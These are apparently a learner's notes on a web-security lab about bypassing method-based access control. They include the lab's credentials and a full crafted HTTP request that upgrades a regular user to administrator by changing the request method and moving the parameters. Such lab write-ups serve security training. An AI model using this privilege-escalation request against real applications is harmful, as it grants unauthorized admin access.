# IDOR NOTES
## METHOD BASED ACCESS CONTROL CAN BE CIRCUMENTED
    ### recon
    - admin credentials: administrator:admin

    -my-credentials: wiener:peter

    #### behaviour when logged in as an admin
    -upgrade user
    --POST /admin-roles
    in request body: username=carlos&action=upgrade

    -downgrade the user
    --POST /admin-roles
    in request body: username=carlos&action=downgrade



    #### behaviour when logged in as a regular user
    just nothing --- just changing the email and nothing else important
    change the request to same as admin: You get unauthorized... mmh nice..

    ### solving the lab
    - as the admin you can make post requests to the server
    -as the regular user you cannot
    - change the method to GET and path as /admin-roles
    - realise the server responds with *missing parameter 'username*
    - observe the request sent by admin and craft similar one to that as shown:
        POST /admin-roles?username=wiener&action=upgrade HTTP/2
        Host: 0aa70076033dc29c803267a700750036.web-security-academy.net
        Cookie: session=Gm3NLGDGiQkGtPmy1fpZ7oRhSHWdkH1T
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0
        Origin: https://0aa70076033dc29c803267a700750036.web-security-academy.net
        Referer: https://0aa70076033dc29c803267a700750036.web-security-academy.net/my-account?id=admin
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers

    - With this request you upgrade yourself :)
    - Navigate to UI/UX and perform admin duties :)

YOU NOTICE THE LAB CHANGED TO SOLVED......always try changing the method and observing the behaviour...
NB: ONLY LOOK FOR SOLUTION AFTER YOU HAVE TRIED YOUR BEST WITH NO LUCK FOR SOME DAYS.
HAPPY HACKING :)


